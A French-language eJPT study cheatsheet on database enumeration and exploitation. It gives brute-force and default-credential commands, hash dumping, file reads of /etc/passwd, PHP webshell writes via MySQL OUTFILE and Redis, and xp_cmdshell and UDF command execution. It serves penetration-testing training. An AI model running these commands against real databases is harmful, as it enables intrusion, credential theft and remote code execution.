# 🗄️ Database Services Enumeration - Cheatsheet eJPT

## 🐬 1. MySQL (Port 3306) - Énumération & Exploitation

### Scripts Nmap pour MySQL
| Script | Description | Usage |
|--------|-------------|-------|
| `mysql-info` | Informations serveur MySQL | `nmap --script mysql-info target` |
| `mysql-users` | Énumération utilisateurs | `nmap --script mysql-users target` |
| `mysql-databases` | Énumération bases de données | `nmap --script mysql-databases target` |
| `mysql-variables` | Variables système | `nmap --script mysql-variables target` |
| `mysql-empty-password` | Test mots de passe vides | `nmap --script mysql-empty-password target` |
| `mysql-brute` | Brute force MySQL | `nmap --script mysql-brute target` |
| `mysql-dump-hashes` | Dump des hashes | `nmap --script mysql-dump-hashes target` |
| `mysql-query` | Exécution requêtes | `nmap --script mysql-query target` |

### Commandes Nmap MySQL essentielles
```bash
# Énumération MySQL complète
nmap -p3306 --script mysql-* target

# Énumération de base
nmap -p3306 -sV --script mysql-info,mysql-empty-password target

# Test credentials faibles
nmap -p3306 --script mysql-brute --script-args userdb=users.txt,passdb=passwords.txt target

# Avec authentication
nmap --script mysql-databases --script-args mysqluser=root,mysqlpass=password target

# Banner grabbing MySQL
nc target 3306
telnet target 3306
```

### Modules Metasploit MySQL
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/mysql/mysql_version` | Version MySQL | `use auxiliary/scanner/mysql/mysql_version` |
| `auxiliary/scanner/mysql/mysql_login` | Brute force MySQL | `use auxiliary/scanner/mysql/mysql_login` |
| `auxiliary/admin/mysql/mysql_sql` | Exécution SQL | `use auxiliary/admin/mysql/mysql_sql` |
| `auxiliary/scanner/mysql/mysql_schemadump` | Dump schéma | `use auxiliary/scanner/mysql/mysql_schemadump` |
| `auxiliary/scanner/mysql/mysql_hashdump` | Dump hashes | `use auxiliary/scanner/mysql/mysql_hashdump` |
| `auxiliary/scanner/mysql/mysql_file_enum` | Énumération fichiers | `use auxiliary/scanner/mysql/mysql_file_enum` |
| `auxiliary/admin/mysql/mysql_enum` | Énumération générale | `use auxiliary/admin/mysql/mysql_enum` |

### Workflow Metasploit MySQL
```bash
# 1. Détection version MySQL
use auxiliary/scanner/mysql/mysql_version
set RHOSTS target
run

# 2. Brute force MySQL
use auxiliary/scanner/mysql/mysql_login
set RHOSTS target
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set VERBOSE true
run

# 3. Si credentials trouvés → Énumération
use auxiliary/admin/mysql/mysql_enum
set RHOSTS target
set USERNAME root
set PASSWORD foundpassword
run

# 4. Dump des hashes
use auxiliary/scanner/mysql/mysql_hashdump
set RHOSTS target
set USERNAME root
set PASSWORD foundpassword
run
```

### Connexion manuelle MySQL
```bash
# Connexion locale
mysql -u root -p

# Connexion distante
mysql -h target -u root -p
mysql -h target -u root -ppassword

# Test sans mot de passe
mysql -h target -u root
mysql -h target -u admin

# Avec port personnalisé
mysql -h target -P 3307 -u root -p
```

### Commandes SQL essentielles
```sql
-- Informations système
SELECT version();
SELECT user();
SELECT database();
SHOW databases;
SHOW tables;

-- Énumération utilisateurs
SELECT user,host,password FROM mysql.user;
SELECT user,authentication_string FROM mysql.user;

-- Privilèges
SHOW grants;
SHOW grants FOR 'root'@'localhost';

-- Variables importantes
SHOW variables LIKE 'secure_file_priv';
SHOW variables LIKE 'general_log%';
SELECT @@datadir;

-- Lecture de fichiers (si privilèges)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:\\windows\\system32\\drivers\\etc\\hosts');

-- Écriture de fichiers
SELECT 'shell code' INTO OUTFILE '/var/www/html/shell.php';

-- UDF (User Defined Functions) pour RCE
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');
```

### Brute Force MySQL avec Hydra
```bash
# Brute force utilisateur root
hydra -l root -P passwords.txt mysql://target

# Avec liste d'utilisateurs
hydra -L users.txt -P passwords.txt mysql://target

# Options recommandées
hydra -L users.txt -P passwords.txt -t 16 -f mysql://target

# Avec port personnalisé
hydra -l root -P passwords.txt -s 3307 mysql://target
```

---

## 🐘 2. PostgreSQL (Port 5432) - Énumération & Exploitation

### Scripts Nmap pour PostgreSQL
| Script | Description | Usage |
|--------|-------------|-------|
| `pgsql-brute` | Brute force PostgreSQL | `nmap --script pgsql-brute target` |

### Modules Metasploit PostgreSQL
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/postgres/postgres_version` | Version PostgreSQL | `use auxiliary/scanner/postgres/postgres_version` |
| `auxiliary/scanner/postgres/postgres_login` | Brute force PostgreSQL | `use auxiliary/scanner/postgres/postgres_login` |
| `auxiliary/admin/postgres/postgres_sql` | Exécution SQL | `use auxiliary/admin/postgres/postgres_sql` |
| `auxiliary/scanner/postgres/postgres_schemadump` | Dump schéma | `use auxiliary/scanner/postgres/postgres_schemadump` |

### Connexion manuelle PostgreSQL
```bash
# Connexion locale
psql -U postgres

# Connexion distante
psql -h target -U postgres
psql -h target -U postgres -d database

# Test sans mot de passe
psql -h target -U postgres -W

# Avec port personnalisé
psql -h target -p 5433 -U postgres
```

### Commandes PostgreSQL essentielles
```sql
-- Informations système
SELECT version();
SELECT current_user;
SELECT current_database();
\l -- Liste databases
\dt -- Liste tables
\du -- Liste utilisateurs

-- Lecture de fichiers
CREATE TABLE temp(data text);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp;

-- Exécution de commandes (si superuser)
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('id');
```

---

## 🏢 3. Microsoft SQL Server (Port 1433) - Énumération & Exploitation

### Scripts Nmap pour MSSQL
| Script | Description | Usage |
|--------|-------------|-------|
| `ms-sql-info` | Informations MSSQL | `nmap --script ms-sql-info target` |
| `ms-sql-brute` | Brute force MSSQL | `nmap --script ms-sql-brute target` |
| `ms-sql-empty-password` | Test mots de passe vides | `nmap --script ms-sql-empty-password target` |
| `ms-sql-xp-cmdshell` | Test xp_cmdshell | `nmap --script ms-sql-xp-cmdshell target` |
| `ms-sql-config` | Configuration MSSQL | `nmap --script ms-sql-config target` |
| `ms-sql-dump-hashes` | Dump hashes | `nmap --script ms-sql-dump-hashes target` |

### Modules Metasploit MSSQL
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/mssql/mssql_login` | Brute force MSSQL | `use auxiliary/scanner/mssql/mssql_login` |
| `auxiliary/admin/mssql/mssql_enum` | Énumération MSSQL | `use auxiliary/admin/mssql/mssql_enum` |
| `auxiliary/admin/mssql/mssql_exec` | Exécution commandes | `use auxiliary/admin/mssql/mssql_exec` |
| `auxiliary/admin/mssql/mssql_sql` | Exécution SQL | `use auxiliary/admin/mssql/mssql_sql` |
| `exploit/windows/mssql/mssql_payload` | Payload MSSQL | `use exploit/windows/mssql/mssql_payload` |

### Connexion manuelle MSSQL
```bash
# Avec sqlcmd (Windows)
sqlcmd -S target -U sa -P password

# Avec sqsh (Linux)
sqsh -S target -U sa -P password

# Avec impacket mssqlclient
mssqlclient.py sa:password@target
mssqlclient.py DOMAIN/user:password@target
```

### Commandes MSSQL essentielles
```sql
-- Informations système
SELECT @@version;
SELECT SUSER_NAME();
SELECT DB_NAME();

-- Énumération
SELECT name FROM sys.databases;
SELECT name FROM sys.tables;
SELECT name FROM sys.server_principals WHERE type = 'S';

-- xp_cmdshell pour RCE
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Lecture de fichiers
BULK INSERT temp FROM 'C:\windows\system32\drivers\etc\hosts';

-- Hashes utilisateurs
SELECT name, password_hash FROM sys.sql_logins;
```

---

## 📊 4. Oracle Database (Port 1521) - Énumération & Exploitation

### Scripts Nmap pour Oracle
| Script | Description | Usage |
|--------|-------------|-------|
| `oracle-sid-brute` | Brute force SID Oracle | `nmap --script oracle-sid-brute target` |
| `oracle-brute` | Brute force Oracle | `nmap --script oracle-brute target` |
| `oracle-enum-users` | Énumération utilisateurs | `nmap --script oracle-enum-users target` |

### Modules Metasploit Oracle
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/oracle/oracle_login` | Brute force Oracle | `use auxiliary/scanner/oracle/oracle_login` |
| `auxiliary/scanner/oracle/sid_enum` | Énumération SID | `use auxiliary/scanner/oracle/sid_enum` |
| `auxiliary/admin/oracle/oracle_sql` | Exécution SQL | `use auxiliary/admin/oracle/oracle_sql` |

### Connexion manuelle Oracle
```bash
# Avec sqlplus
sqlplus user/password@target:1521/SID

# Test SID courants
sqlplus system/manager@target:1521/ORCL
sqlplus scott/tiger@target:1521/XE
```

---

## 🚀 5. MongoDB (Port 27017) - Énumération & Exploitation

### Scripts Nmap pour MongoDB
| Script | Description | Usage |
|--------|-------------|-------|
| `mongodb-info` | Informations MongoDB | `nmap --script mongodb-info target` |
| `mongodb-databases` | Énumération databases | `nmap --script mongodb-databases target` |

### Connexion manuelle MongoDB
```bash
# Connexion locale
mongo

# Connexion distante
mongo target:27017
mongo target:27017/database

# Test sans authentification
mongo target --eval "db.adminCommand('listCollections')"
```

### Commandes MongoDB essentielles
```javascript
// Informations système
db.version()
db.serverStatus()

// Énumération
show dbs
show collections
db.users.find()

// Lecture de données
db.collection.find()
db.collection.find().pretty()
```

---

## 🔧 6. Redis (Port 6379) - Énumération & Exploitation

### Scripts Nmap pour Redis
| Script | Description | Usage |
|--------|-------------|-------|
| `redis-info` | Informations Redis | `nmap --script redis-info target` |

### Connexion manuelle Redis
```bash
# Connexion Redis
redis-cli -h target
redis-cli -h target -p 6379

# Test sans authentification
redis-cli -h target ping
```

### Commandes Redis essentielles
```bash
# Informations
INFO
CONFIG GET "*"

# Énumération
KEYS *
GET key
SCAN 0

# Exploitation (si pas d'auth)
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET webshell "<?php system($_GET['cmd']); ?>"
SAVE
```

---

## 🎯 7. Cas d'usage spécifiques eJPT

### Scénario 1: MySQL avec credentials faibles
```bash
# 1. Découverte MySQL
nmap -p3306 -sV target

# 2. Test credentials courants
mysql -h target -u root
mysql -h target -u root -proot
mysql -h target -u admin -padmin

# 3. Si succès → Énumération
mysql -h target -u root -proot -e "SHOW databases;"
mysql -h target -u root -proot -e "SELECT user,password FROM mysql.user;"

# 4. Tentative RCE via file write
mysql -h target -u root -proot -e "SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';"
```

### Scénario 2: MSSQL avec xp_cmdshell
```bash
# 1. Découverte MSSQL
nmap -p1433 --script ms-sql-info target

# 2. Brute force
use auxiliary/scanner/mssql/mssql_login
set RHOSTS target
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# 3. Si succès → Test xp_cmdshell
use auxiliary/admin/mssql/mssql_exec
set RHOSTS target
set USERNAME sa
set PASSWORD foundpassword
set CMD whoami
run
```

### Scénario 3: MongoDB sans authentification
```bash
# 1. Test connexion MongoDB
mongo target:27017 --eval "db.adminCommand('listCollections')"

# 2. Si accès → Énumération
mongo target:27017
show dbs
use sensitive_db
show collections
db.users.find()
db.passwords.find()
```

---

## 📋 8. Wordlists bases de données

### Utilisateurs bases de données courants
```bash
cat > db_users.txt << EOF
root
admin
administrator
sa
postgres
oracle
mysql
user
test
guest
demo
service
app
web
db
database
EOF
```

### Mots de passe bases de données courants
```bash
cat > db_passwords.txt << EOF
password
123456
admin
root
sa
postgres
oracle
mysql
password123
admin123
qwerty
welcome
changeme
default
service
database
db
passw0rd
EOF
```

### SID Oracle courants
```bash
cat > oracle_sids.txt << EOF
ORCL
XE
PROD
DEV
TEST
DB
DATABASE
ORACLE
SID
SYSTEM
EOF
```

---

## 💡 9. Conseils et astuces eJPT

### Workflow bases de données recommandé
1. **Découverte** : `nmap -p3306,5432,1433,1521,27017,6379 -sV target`
2. **Test auth** : Credentials par défaut avant brute force
3. **Brute force** : Si auth échoue
4. **Énumération** : Users, databases, tables après accès
5. **Escalation** : RCE via file write, xp_cmdshell, UDF

### Points critiques DB eJPT
- **MySQL root sans password** très fréquent
- **MSSQL xp_cmdshell** souvent activé dans labs
- **MongoDB sans auth** configuration par défaut
- **File write permissions** souvent présentes
- **Credentials dans databases** pour autres services

### Erreurs courantes à éviter
- **Ne pas tester auth vide** avant brute force
- **Ignorer ports DB non-standards**
- **Oublier RCE** après accès DB
- **Ne pas énumérer autres databases**
- **Manquer credentials** stockés en DB

### Tests d'authentification prioritaires
```bash
# MySQL
mysql -h target -u root
mysql -h target -u root -proot
mysql -h target -u admin -padmin

# PostgreSQL  
psql -h target -U postgres
psql -h target -U admin

# MSSQL
mssqlclient.py sa:@target
mssqlclient.py sa:sa@target

# MongoDB
mongo target --eval "db.version()"

# Redis
redis-cli -h target ping
```

### One-liners bases de données
```bash
# Discovery DB multi-services
nmap -p3306,5432,1433,1521,27017,6379 --script mysql-empty-password,ms-sql-empty-password,redis-info,mongodb-info target

# Test MySQL auth rapide
for pass in "" root admin password; do mysql -h target -u root -p$pass -e "SELECT version();" 2>/dev/null && echo "Success: root:$pass"; done

# Test MSSQL xp_cmdshell
mssqlclient.py sa:password@target -windows-auth
```

### Ports bases de données à scanner
```bash
# Ports DB standards
3306    # MySQL
5432    # PostgreSQL
1433    # MSSQL
1521    # Oracle
27017   # MongoDB
6379    # Redis
5984    # CouchDB
9200    # Elasticsearch

# Scan complet DB
nmap -p3306,5432,1433,1521,27017,6379,5984,9200 -sV target
```

### Techniques RCE par base de données
| Base | Technique | Prérequis |
|------|-----------|-----------|
| **MySQL** | `SELECT INTO OUTFILE` | FILE privileges |
| **MSSQL** | `xp_cmdshell` | sysadmin role |
| **PostgreSQL** | `COPY FROM PROGRAM` | superuser |
| **Oracle** | Java stored procedures | DBA privileges |
| **MongoDB** | `$where` JavaScript | No auth |
| **Redis** | `CONFIG SET dir` | No auth |

**🎯 Conseil final eJPT :** Les bases de données dans l'eJPT sont souvent mal configurées. Pattern typique : découverte → test auth par défaut → si succès énumération → tentative RCE via file write/command execution. MySQL root sans password = 60% des labs DB !